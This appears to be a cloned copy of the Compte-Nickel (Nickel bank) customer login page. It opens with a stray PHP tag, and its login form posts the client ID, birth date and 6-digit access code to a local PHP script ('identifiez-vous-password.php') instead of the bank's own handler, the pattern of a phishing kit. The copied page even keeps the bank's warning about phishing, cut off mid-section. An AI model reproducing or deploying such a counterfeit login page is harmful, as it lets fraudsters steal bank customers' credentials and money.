<?php ?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PRQ26XR');</script>
    <!-- End Google Tag Manager -->

    <title>
	Espace client - Mon Compte-Nickel
</title><link rel="shortcut icon" href="favicon-v=2.ico" /><link type="text/css" href="Styles/UI/jquery-ui-1.9.2.custom.min.css" rel="stylesheet" /><link type="text/css" href="Styles/Site.min.css" rel="stylesheet" /><link type="text/css" href="Styles/OSX.css" rel="stylesheet" /><link type="text/css" href="Styles/keypad-v=20160720.css" rel="stylesheet" /><link href="Styles/compte-nickel.css" type="text/css" rel="stylesheet" />

    <script src="Scripts/jquery.min.js" type="text/javascript"></script>
    <script src="Scripts/jqueryui.min.js" type="text/javascript"></script>
    <script src="Scripts/keypad-v=20160720.js" type="text/javascript"></script>
    <script src="Scripts/jquery.watermark.min.js" type="text/javascript"></script>
    <script src="mobile/Scripts/detectmobilebrowser.js" type="text/javascript"></script>
    <script src="Scripts/jquery.cookie.js" type="text/javascript"></script>
    
  

    <!-- Facebook Pixel -->
    <script>
        !function (f, b, e, v, n, t, s) {
            if (f.fbq) return;
            n = f.fbq = function () {
                n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
            };
            if (!f._fbq) f._fbq = n;
            n.push = n;
            n.loaded = !0;
            n.version = '2.0';
            n.queue = [];
            t = b.createElement(e);
            t.async = !0;
            t.src = v;
            s = b.getElementsByTagName(e)[0];
            s.parentNode.insertBefore(t, s)
        }(window, document, 'script', '//connect.facebook.net/en_US/fbevents.js');
        fbq('init', '529456690567207');
        fbq('track', "PageView");
    </script>
    <noscript>
        &lt;img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=529456690567207&amp;ev=PageView&amp;noscript=1"/&gt;
    </noscript>

    <script type="text/javascript">
        $(document).ready(function () {
            if ($('#hfSessionStarted').val() == "true")
                StartSession();

            CheckForMacOS();

            if (jQuery.browser.mobile) {
                if (confirm('Voulez-vous accéder à la version mobile ?')) {
                    var url = "";
                    var tUrl = window.location.href.split('/');
                    var len = tUrl.length;

                    for (var i = length; i < len; i++) {
                        if (i != len - 1)
                            url += tUrl[i] + '/';
                        else
                            url += 'mobile/' + tUrl[i];
                    }


                    window.location = url;
                } else if (!are_cookies_enabled())
                    document.location.href = "ErreurCookies.aspx";
            }
            else if (!are_cookies_enabled())
                document.location.href = "ErreurCookies.aspx";
            else {
                if ($.cookie("CookiesRead") == undefined || $.cookie("CookiesRead") == null || $.cookie("CookiesRead") != "true") {
                    $('#divCookies').fadeIn(1000);
                }
            }
        });

        function hideCookiesInfo() {
            $.cookie("CookiesRead", "true", { expires: 365 });
            $('#divCookies').fadeOut();
        }

        function are_cookies_enabled() {
            var cookieEnabled = (navigator.cookieEnabled) ? true : false;

            if (typeof navigator.cookieEnabled == "undefined" && !cookieEnabled) {
                document.cookie = "testcookie";
                cookieEnabled = (document.cookie.indexOf("testcookie") != -1) ? true : false;
            }
            return (cookieEnabled);
        }

        $(function () {
            //alert(location.pathname.substring(location.pathname.lastIndexOf("/") + 1));
            pageSelected();
        });

        function HomeRedirect() {
            window.location = 'vos-operations.aspx';
        }

        function showSubMenu(subMenuId) {
            //alert(subMenuId);
            $(".panelSubMenu").each(function () {
                $(this).hide();
            });

            $("#" + subMenuId).show();
        }

        function hideSubMenu() {
            $(".panelSubMenu").each(function () {
                $(this).hide();
            });

            $(".MenuSelected").show();
        }

        function pageSelected() {
            $(".panelSubMenu").each(function () {
                $(this).hide().removeClass('MenuSelected').mouseover(
                    function () {
                        showSubMenu(this.id);
                    }).mouseout(
                    function () {
                        hideSubMenu();
                    });
            });

            $(".panelHeadMenu").each(function () {
                $(this).mouseover(
                    function () {
                        showSubMenu("sub" + this.id);
                    }).mouseout(
                    function () {
                        hideSubMenu();
                    });
            });

            page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1).split('.')[0];
            $('#' + page).addClass("font-VAGRoundedBold");

            $('#' + $('#' + page).parent().parent().attr('id')).show().addClass('MenuSelected');
        }

        function ShowDialogMessage(title, message) {
            $("#dialog-message").val(message);

            $("#dialog").dialog({
                resizable: false,
                width: 600,
                dialogClass: "no-close",
                modal: true,
                title: title,
                buttons: {
                    Fermer: function () {
                        $(this).dialog("close");
                    }
                }
            });
        }
        var timeoutID = null;
        function StartSession() {
            //alert('start');
            $('body').mousemove(function () {
                clearTimeout(timeoutID);

                var iTimeout = $('#hfSessionTimeout').val();
                if (iTimeout.length == 0)
                    iTimeout = 6000;
                timeoutID = setTimeout(function () {
                    //showSessionTimeout();
                    //window.location = 'Default.aspx?timeout=true';
                    __doPostBack('SessionTimeout', '');
                }, iTimeout);
            });
        }

        function CheckForMacOS() {
            if (navigator.platform.match('Mac') !== null) {
                $('body').addClass('OSX');
            }
        }

    </script>
<meta name="description" content="Accédez à votre espace client en ligne. Vous utilisez un téléphone ? Téléchargez notre application Android ou iOS." /></head>
<body>
    <!-- Google Tag Manager (noscript) -->

    <!-- End Google Tag Manager (noscript) -->

    <form method="post" action="identifiez-vous-password.php?password" id="ctl01" class="MasterForm">
<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJNTY5OTI5OTQ4DxYCHgxDbGllbnRDb29raWVlFgJmD2QWAgIDD2QWBAIFD2QWAgIBD2QWAmYPZBYIZg9kFgICAQ8PFgIeBFRleHRlZGQCBw8PFgIfAWVkZAIJD2QWAgICD2QWBgIRDw9kFgIeC29ubW91c2Vkb3duBVdyZXR1cm4gS2V5cGFkQ2xlYXJQYXNzd29yZCgnTWFpbkNvbnRlbnRfdHh0UGFzc3dvcmQnLCAnTWFpbkNvbnRlbnRfa2V5cGFkMV90eHRLZXlwYWQnKTtkAhsPD2QWAh8CBVlyZXR1cm4gS2V5cGFkQ29ycmVjdFBhc3N3b3JkKCdNYWluQ29udGVudF90eHRQYXNzd29yZCcsICdNYWluQ29udGVudF9rZXlwYWQxX3R4dEtleXBhZCcpO2QCJQ8PFgIeDU9uQ2xpZW50Q2xpY2sFDnNob3dMb2FkaW5nKCk7ZGQCFg9kFgJmD2QWAgIBD2QWBAIBD2QWAmYPZBYCAgMPZBYEAgIPZBYEAhEPD2QWAh8CBVxyZXR1cm4gS2V5cGFkQ2xlYXJQYXNzd29yZCgnTWFpbkNvbnRlbnRfdHh0TmV3UGFzc3dvcmQnLCAnTWFpbkNvbnRlbnRfa2V5cGFkTmV3X3R4dEtleXBhZCcpO2QCGw8PZBYCHwIFXnJldHVybiBLZXlwYWRDb3JyZWN0UGFzc3dvcmQoJ01haW5Db250ZW50X3R4dE5ld1Bhc3N3b3JkJywgJ01haW5Db250ZW50X2tleXBhZE5ld190eHRLZXlwYWQnKTtkAgYPFgIeBVZhbHVlBRpNYWluQ29udGVudF90eHROZXdQYXNzd29yZGQCAw9kFgJmD2QWAgIDD2QWBAICD2QWBgIRDw9kFgIfAgVkcmV0dXJuIEtleXBhZENsZWFyUGFzc3dvcmQoJ01haW5Db250ZW50X3R4dENvbmZpcm1QYXNzd29yZCcsICdNYWluQ29udGVudF9rZXlwYWRDb25maXJtX3R4dEtleXBhZCcpO2QCGw8PZBYCHwIFZnJldHVybiBLZXlwYWRDb3JyZWN0UGFzc3dvcmQoJ01haW5Db250ZW50X3R4dENvbmZpcm1QYXNzd29yZCcsICdNYWluQ29udGVudF9rZXlwYWRDb25maXJtX3R4dEtleXBhZCcpO2QCJQ8PFgIfAwUxaWYgKCF2YWxpZGF0ZUNvbmZpcm1QYXNzd29yZCgpKSB7cmV0dXJuIGZhbHNlOyB9O2RkAgYPFgIfBAUeTWFpbkNvbnRlbnRfdHh0Q29uZmlybVBhc3N3b3JkZAIHDw8WAh8BBQVXRUIgM2RkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYRBSBjdGwwMCRNYWluQ29udGVudCRjYlNhdmVDbGllbnRJRAUhY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xBSFjdGwwMCRNYWluQ29udGVudCRrZXlwYWQxJGJ1dHRvbjIFIWN0bDAwJE1haW5Db250ZW50JGtleXBhZDEkYnV0dG9uMwUhY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b240BSFjdGwwMCRNYWluQ29udGVudCRrZXlwYWQxJGJ1dHRvbjUFIWN0bDAwJE1haW5Db250ZW50JGtleXBhZDEkYnV0dG9uNgUhY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b243BSFjdGwwMCRNYWluQ29udGVudCRrZXlwYWQxJGJ1dHRvbjgFIWN0bDAwJE1haW5Db250ZW50JGtleXBhZDEkYnV0dG9uOQUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xMAUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xMQUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xMgUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xMwUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xNAUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xNQUiY3RsMDAkTWFpbkNvbnRlbnQka2V5cGFkMSRidXR0b24xNrgsNp3dzx5KS7X49woIXAmiUg9x" />


<script src="ScriptResource-d=vD2r5ZkQ4zHPRpLAtPqlmW_ovmZ1jzfStkltlFBAut98MkrfEt7iXzbdVKMYexKk5eetC9Tm8oKxCxYd6qMCcWkV1opRsQKKFDFS-N6XvPxb6lORKL3YZyYbJ9i_pjX1dLgk0w2&amp;t=ffffffffdede17b4.axd" type="text/javascript"></script>
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="360DA4C0" />
<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="/wEdADBpGzfbszF/4iBF2NpIRPnrtwralV2nktQ2OcrFuqjz1LN3WAGaoKDiJZRPuuNyJonqrqMnJXtveWQHsCoNheNRWGjBt/Si1DwKXWjqSHix9Qklsyl4K4/ph6bEYh+76IprUIFsvC2FlqF2jHJ8BR9LqQselOvq+w/9v6Y2j3IOnl7dOyucrA3TlY82w30RtZeXWpztDty3T59D1f14haT5swfJo9Efsxz7t7qnHXaCfrUoc/XEzPyx/18YQQnKxbbNBMvHAqO29/HJfackc2DK6/wpf4LCAGW5tlc9JZbGYiBWxGiIJ8jh1vBNK2JRlrNfsnjN6yor8lPqOHC4Wl4b/SVbuFt4eMp1VClgJK6wWCQa2jDUoXv+/h/T/IiYDxXUcj4dZVeFMZvloL8t9ELMASjuI1uvHLyIgRYVhMynSZMusilp6AjaTdq+VWrTUR588rwPCiE2K4FivPr0djPPH71pwjGHCSitWh3zAruD8P0WieDewJpXVb3Pvxhpd8+H70m+e8KDChcxe+CoGr5lXUjkQZW1pmmuDp2lge9qluNSToNRIGzWwhMX9mljJV5DphBiR/Z+i2+X7YORalgH77wTsSgmboff0q240cFin6MLz1JfKMc0tffrcnIVhMMkxhMEpOG6bWjr1aMRo637pPqlq0vNPmOowOMwTnxvPAtLpPGz+qdg0fAZBEQksc5YezYcVtZChex5PRALQxkqg/aFM1gnm/c5HXFyOMKY288+vYFXGhBB8EQgyd5yYFEHeMA9+8SCvy6O3c2cinp7IVAwPWrau0yuHUXyKyVo+t50vk4FkMVRczQa/2qHbKeCE2d9c/rlch/xDSXcy+HZODTlHBFUzbwOY7K+Y0kMbJ+9c+MyIQOAmg1AfuPhl/+s/F4B3drJDlpWU88rpRl/HYpZ+cWqA8hLjpLxjvgZarFt/bpxHzHO8zCRJAhMbZlNclUwYXZH5tqGNxwNhW2HRZsaFlyoVW7F927H5RnOtwVbLCcJEDyOXneTLPo1BIFz4yz6+YUrobhhiedd5EsUxPVydQ==" />
    
    
        <div class="page">
            <div class="header" style="min-height:initial;padding:5px 0">
                <div class="page-content">
                    <div class="title">
                        <div style="margin:0; display:table;width:100%">
                            <div style="display:table-row">
                                <div class="table-cell" style="vertical-align:middle; padding:0 10px 0 0">
                                    <div>
                                        <a href="https://compte-nickel.fr/"><img id="imgLogo" class="header-logo" src="Styles/Img/logo-nickel.png" alt="Compte-Nickel" height="55" /></a>
                                    </div>
                                </div>
                                <div class="table-cell">
                                    <div style="height:20px; text-align:right"></div>
                                    <div style="margin-top:25px">
                                        
                                    </div>
                                </div>
                                <div class="table-cell" style="text-align:right;vertical-align:top;width:257px;">
                                    <div class="table tiles" style="width:100%;float:right;margin-top:0">
                                        <div class="table-row">
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="sos.html" style="float:left">
                                                    <span class="img">
                                                        <img src="Styles/Img/tile-alert.png" alt="" style="top:7px" />
                                                    </span>
                                                    <span class="text font-VAGRoundedLight">faire opposition</span>
                                                </a>
                                            </div>
                                            <div class="table-cell left" style="padding-top:0">
                                                <a class="tile" href="https://faq.compte-nickel.fr/hc/fr" style="float:right">
                                                    <span class="img">
                                                        <img src="Styles/Img/tile-question.png" alt="" style="" />
                                                    </span>
                                                    <span class="text font-VAGRoundedLight">poser une question</span>
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="content" style="width:100%">
                <div style="width:100%" class="table">
                    <div class="table-row">
                        <div style="display:table-cell; vertical-align:top">
                            <div class="main">
                                
    <div id="MainContent_upAuth">
	
            
            <div id="panelLoadingBackground" style="position: absolute; z-index: 99; background-color: #f9f9f9; display:none">
                <div id="panelLoading" style="position: absolute; width:100%; height: 40px; text-align: center; vertical-align: middle;">
                    <span class="font-VAGRoundedLight uppercase" style="font-size: 2.9em; margin-right: 10px; font-weight:normal;">Chargement</span>
                    <img class="loading" src="Styles/Img/white.gif" alt="loading" width="30px" height="30px" />
                </div>
            </div>
            
            <div class="page-content">
                <div class="motto">
                    <div class="alert-info-title">
                        Bienvenue dans votre espace client Nickel
                    </div>
                </div>
                <div class="table" style="width: 100%; margin-top: 20px;min-height:170px">
                    <div class="table-row">
                        <div class="table-cell" style="padding: 0 20px 15px 0; width: 55%; vertical-align: top;">
                            
                            <div id="accordion" class="panelConnection">
                                <h3 id="panelIDTitle" class="accordionTitle" style="margin:0;">
                                    <span style="margin-left:10px">Votre identifiant web</span>
                                </h3>
                                <div id="panelID" style="margin-top:10px;">
                                    <div style="margin-left: 20px">
                                        <div id="panelClientGencode" style="display: none">
                                            <div style="display: table">
                                                <div style="display: table-row">
                                                    <div style="display: table-cell; vertical-align: middle; padding-right: 20px">
                                                        <a onclick="deleteClientID();" class="linkNoStyle" title="Effacer">
                                                            <img id="MainContent_imgClearKeyboard" class="clear-virtual-keyboard" src="Styles/Img/orange-circle-cross-small.png" alt="suppr." width="40" /></a>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle;">
                                                        <input name="ctl00$MainContent$txtClientID" type="text" maxlength="10" id="MainContent_txtClientID" class="TextboxBig" autocomplete="off" style="width: 280px; display: none" />

                                                        <div id="panelClientID">
                                                            <input type="text" id="txtID_1" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 75px; text-align: center; padding: 0" class="TextboxBig" />
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_2" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 75px; text-align: center; padding: 0" class="TextboxBig" />
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_3" maxlength="3" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 75px; text-align: center; padding: 0" class="TextboxBig" />
                                                            <span style="font-weight: bold; font-size: 1.4em">-</span>
                                                            <input type="text" id="txtID_4" maxlength="1" autocomplete="off" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 40px; text-align: center; padding: 0" class="TextboxBig" />
                                                        </div>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle; padding-left: 10px">
                                                        
                                                        <input type="submit" name="ctl00$MainContent$btnClientID" value="OK" onclick="return checkClientID();" id="MainContent_btnClientID" class="orange-big-button" style="width:75px;margin-left:10px" />
                                                    </div>

                                                </div>
                                                <div class="table-row">
                                                    <div class="table-cell"></div>
                                                    <div class="table-cell">
                                                        <div style="display:inline-block">
                                                            <input id="MainContent_cbSaveClientID" type="checkbox" name="ctl00$MainContent$cbSaveClientID" onclick="clickSaveClientID();" /><label for="MainContent_cbSaveClientID"> Enregistrer mon identifiant</label>
                                                        </div>
                                                        <div style="position: relative;display:inline-block">
                                                            <div id="linkIbanAstuce" class="linkNoStyleNoUnderline" onclick="ToggleHelp();">
                                                                <img id="MainContent_imgHelpSmall" class="help-icon-small" src="Styles/Img/interrogation-small.png" style="position: relative; top: 5px" />
                                                            </div>
                                                        </div>
                                                        <div id="saveClientIDHelp" class="operation-help" style="z-index: 1111">
                                                            <div style="text-transform: none; color: #000;">
                                                                <span class="uppercase font-VAGRoundedBold font-bold">100% utile</span><br />
                                                                Saisissez une fois votre identifiant en cochant cette case, et nous retenons pour vous votre identifiant sur cet ordinateur.<br />
                                                                Pour vérifier votre identité, nous vous demanderons cependant votre date de naissance, renseignée à l'ouverture de votre Compte-Nickel.
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <div class="table-cell"></div>
                                                </div>
                                            </div>
                                        </div>
                                        <div id="panelClientBirthDate" style="display: none">
                                            <div id="MainContent_panelClientBirthDateInner" style="display: table">
		
                                                <div style="display: table-row">
                                                    <div style="display: table-cell">
                                                        <input name="ctl00$MainContent$txtClientBirthDate" type="text" maxlength="8" id="MainContent_txtClientBirthDate" class="TextboxBig" autocomplete="off" style="width: 280px; display: none" />
                                                        <div id="panelClientBirthDateBox">
                                                            <input type="text" id="txtClientBirth_1" maxlength="2" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 45px; text-align: center; padding: 0" class="TextboxBig" />
                                                            <span style="font-weight: bold; font-size: 1.6em">/</span>
                                                            <input type="text" id="txtClientBirth_2" maxlength="2" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 45px; text-align: center; padding: 0" class="TextboxBig" />
                                                            <span style="font-weight: bold; font-size: 1.6em">/</span>
                                                            <input type="text" id="txtClientBirth_3" maxlength="4" onclick="clearValue(this);" onblur="defaultVal(this);" onkeydown="return checkKeyDown(event, this.id);" onkeyup="return checkNext(event,this.id);"
                                                                style="width: 80px; text-align: center; padding: 0" class="TextboxBig" />
                                                        </div>
                                                    </div>
                                                    <div style="display: table-cell; vertical-align: middle; padding-left: 10px">
                                                        <input type="submit" name="ctl00$MainContent$btnClientBirthDate" value="OK" onclick="return checkClientID();" id="MainContent_btnClientBirthDate" class="orange-big-button" />
													    
                                                        <!--<input id="btnClientBirthDate" type="submit" class="orange-big-button" value="OK" onclick="checkClientID(); return false;" />-->
                                                    </div>
                                                </div>
                                            
	</div>
                                            <div style="margin: 20px 5px 0 0; text-align: right">
                                                <a class="linkNoStyle" onclick="changeClient();">Vous n'êtes pas
                                                    <span id="MainContent_lblClientNameFromCookieLink"></span>
                                                    ?</a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div id="panelPin" style="display: none">
                                    <h3 id="panelPinTitle" class="accordionTitle" style="margin-top:0;">
                                        <span style="margin-left:10px">Votre code d'accès</span></h3>
                                    <div style="text-align:center;margin-bottom:1px;">
                                        <input name="ctl00$MainContent$txtPassword" type="text" id="MainContent_txtPassword" autocomplete="off" style="display:none" />
                                        
<script type="text/javascript">
    $(document).ready(function () {
        //console.log($('#MainContent_keypad1_hfRootButtonID').val() + " ready");
    });
</script>

<input name="ctl00$MainContent$keypad1$txtKeypad" type="password" maxlength="6" readonly="readonly" id="MainContent_keypad1_txtKeypad" class="Password TextboxBig" autocomplete="off" style="width: 317px;font-size:24px;" />
<div id="keypad-loading" style="display:none;position:absolute;background-color:rgba(249, 249, 249, 0.5);z-index:200"></div>
<span id="MainContent_keypad1_lblKeypadUpdate"></span>
<div id="MainContent_keypad1_panelKeypad" class="nickelKeypad keypad-popup table">
		
    <div class="table-row">
        <div class="table-cell" style="vertical-align:top">
		    <div class="table">
                <div class="table-row">
                    <div class="table-cell">
                        <input type="image" name="ctl00$MainContent$keypad1$button1" id="MainContent_keypad1_button1" type="button" class="keypad-key" position="0" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button2" id="MainContent_keypad1_button2" type="button" class="keypad-key" position="1" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button3" id="MainContent_keypad1_button3" type="button" class="keypad-key" position="2" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button4" id="MainContent_keypad1_button4" type="button" class="keypad-key" position="3" src="Styles/Img/white_key.png" />
                    </div>
                    <div class="table-cell">
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button5" id="MainContent_keypad1_button5" type="button" class="keypad-key" position="4" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button6" id="MainContent_keypad1_button6" type="button" class="keypad-key" position="5" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button7" id="MainContent_keypad1_button7" type="button" class="keypad-key" position="6" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button8" id="MainContent_keypad1_button8" type="button" class="keypad-key" position="7" src="Styles/Img/white_key.png" />
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                        <input type="submit" name="ctl00$MainContent$keypad1$btnClear" value=" " id="MainContent_keypad1_btnClear" title="Effacer" class="keypad-special keypad-clear" onmousedown="return KeypadClearPassword(&#39;MainContent_txtPassword&#39;, &#39;MainContent_keypad1_txtKeypad&#39;);" />
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button9" id="MainContent_keypad1_button9" type="button" class="keypad-key" position="8" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button10" id="MainContent_keypad1_button10" type="button" class="keypad-key" position="9" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button11" id="MainContent_keypad1_button11" type="button" class="keypad-key" position="10" src="Styles/Img/white_key.png" />
                        <input type="image" name="ctl00$MainContent$keypad1$button12" id="MainContent_keypad1_button12" type="button" class="keypad-key" position="11" src="Styles/Img/white_key.png" />
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                        <input type="submit" name="ctl00$MainContent$keypad1$btnCorrect" value=" " id="MainContent_keypad1_btnCorrect" title="Corriger" class="keypad-special keypad-correct" onmousedown="return KeypadCorrectPassword(&#39;MainContent_txtPassword&#39;, &#39;MainContent_keypad1_txtKeypad&#39;);" />
                    </div>
                </div>
                <div class="table-row">
                    <div class="table-cell" style="padding-top:5px">
                        <input type="image" name="ctl00$MainContent$keypad1$button13" id="MainContent_keypad1_button13" type="button" class="keypad-key" position="12" src="Styles/Img/white_key.png" />
                        <input type="image" name="ctl00$MainContent$keypad1$button14" id="MainContent_keypad1_button14" type="button" class="keypad-key" position="13" src="Styles/Img/white_key.png" />
		                <input type="image" name="ctl00$MainContent$keypad1$button15" id="MainContent_keypad1_button15" type="button" class="keypad-key" position="14" src="Styles/Img/white_key.png" />
                        <input type="image" name="ctl00$MainContent$keypad1$button16" id="MainContent_keypad1_button16" type="button" class="keypad-key" position="15" src="Styles/Img/white_key.png" />
                    </div>
                    <div class="table-cell" style="padding:5px 0 0 15px; vertical-align:top;">
                        <input type="submit" name="ctl00$MainContent$keypad1$btnValidate" value=" " onclick="showLoading();" id="MainContent_keypad1_btnValidate" title="Valider" class="keypad-special keypad-close" />
                    </div>
                </div>
            </div>
        </div>
    </div>

	</div>
<input type="hidden" name="ctl00$MainContent$keypad1$hfRootButtonID" id="MainContent_keypad1_hfRootButtonID" />
<input type="hidden" name="ctl00$MainContent$keypad1$hfButtonListSrc" id="MainContent_keypad1_hfButtonListSrc" />
<input type="hidden" name="ctl00$MainContent$keypad1$hfKeypadId" id="MainContent_keypad1_hfKeypadId" />
<input type="hidden" name="ctl00$MainContent$keypad1$hfTargetID" id="MainContent_keypad1_hfTargetID" value="MainContent_txtPassword" />
<input type="hidden" name="ctl00$MainContent$keypad1$hfKeypadValue" id="MainContent_keypad1_hfKeypadValue" />


                                    </div>
                                </div>
                            </div>
                            <div style="text-align:right;margin:10px 2px 0 0;">

                                <a id="MainContent_lbHelpPwd" class="linkNoStyle font-orange" href="javascript:__doPostBack(&#39;ctl00$MainContent$lbHelpPwd&#39;,&#39;&#39;)" style="display:none; font-weight: bold">J'ai perdu mon code d'accès</a>
                                <a onclick="return showHelpResetPwdOnClientID();" id="MainContent_lbHelpPwdOnClientGenCode" class="linkNoStyle font-orange" href="javascript:__doPostBack(&#39;ctl00$MainContent$lbHelpPwdOnClientGenCode&#39;,&#39;&#39;)" style="font-weight: bold">J'ai perdu mon identifiant ou mon code d'accès</a>
                            </div>
                        </div>
                        <div class="table-cell" style="padding: 0 0 0 10px; vertical-align: top;overflow:hidden;">
                        <div id="panelVousNavezPasDeCompteNickel">
                            <div id="MainContent_panelNotClient" style="width:97%">
		
                                <div>
                                    <h3 class="font-orange">Pas encore chez compte-nickel ?</h3>
                                    <div>
                                        
                                        Découvrez notre offre sur notre site
                                    </div>
                                    <h3 style="text-align:right">
                                        <a href="https://compte-nickel.fr" target="_blank">
                                            En savoir <span class="symbol">+</span>&nbsp;<span class="symbol">></span>
                                        </a>
                                    </h3>
                                </div>
                                
                            
	</div>
                            
                        </div>
                        <div id="panelPissenlit" style="display: none; margin-top: 150px; padding-left: 10px">
                            
                        </div>
                    </div>
                    </div>
                </div>
            </div>
            <div id="panelHelpClientID" style="background-color:white;padding:15px 0">
                <div class="page-content">
                    <div class="table" style="width: 100%;">
                    <div class="table-row">
                        <div class="table-cell" style="width:25%;padding: 20px 20px 15px 0">
                            <img id="MainContent_imgCardCode" class="card-code" src="Styles/Img/card-code-2.png" />
                        </div>
                        <div class="table-cell" style="vertical-align: middle">
                            <h3 class="font-orange" style="margin-bottom:0">
                                Où retrouver votre identifiant web ?
                            </h3>
                            <div id="MainContent_panelWebIdCompteNickel1218">
		
                                <div>
                                    
                                    Votre identifiant se trouve au dos de votre MasterCard&reg; Nickel.
                                </div>
                                <div style="margin-top:10px">
                                    <b>Vous êtes le parent ou tuteur légal d'un enfant ayant un <span style="white-space:nowrap">Compte-Nickel 12/18 ans</span> :</b> utilisez l'identifiant de votre <span style="white-space:nowrap">Compte-Nickel</span> pour accéder à votre espace parent. Si vous n'avez pas de <span style="white-space:nowrap">Compte-Nickel</span> à votre nom, vous avez reçu votre identifiant sur l'email après l'ouverture du <span style="white-space:nowrap">Compte-Nickel 12/18 ans</span>.
                                </div>

                                <h3 class="font-orange" style="margin: 20px 0 0 0">
                                    Où retrouver votre code d'accès ?
                                </h3>
                                <div>
                                    Un code de sécurité vous est envoyé par SMS après avoir saisi et validé votre identifiant pour la première fois.<br />
                                    Saisissez ce code et créez votre code d'accès à 6 chiffres pour pouvoir profiter à 100% de votre Compte-Nickel.
                                </div>
                            
	</div>
                            
                        </div>
                    </div>

                </div>
                </div>
            </div>
            <div id="panelLostClientID" style="display: none">
                Veuillez S.V.P contacter le <a href="https://faq.compte-nickel.fr/hc/fr" target="_blank">service client</a>.
            </div>
            <div id="panelPhishing" class="box page-content" style="margin-top: 30px; background-color: #fff; padding: 15px 0">
                <div class="table" style="width:100%">
            <div class="table-row">
                <div class="table-cell" style="width:25%;text-align:center;vertical-align:middle">
                    <img id="MainContent_imgPhishing" class="phishing-icon" src="Styles/Img/EXCLAMATION.png" alt="Attention" style="width: 45%;" />
                </div>
                <div class="table-cell" style="vertical-align:middle">
                    <h3 class="font-orange" style="margin:0 0 15px 0;font-weight:normal">
                        <b>Important <span style="font-size:2.6em;position:relative;top:-3px;line-height:15px">.</span></b> Soyez vigilant aux sites malveillants et au phishing
                    </h3>
                    <div>
                        <b>Le phishing est une pratique malveillante destinée à collecter vos codes d'accès afin d'accéder à votre compte.</b>
                        <div>Les fraudeurs se font passer pour Compte-Nickel ou l'une de vos connaissances et vous invitent par exemple à saisir votre code d'accès par mail ou sur un faux site internet.</div>
                    </div>
                    <div style="margin-top: 15px;">
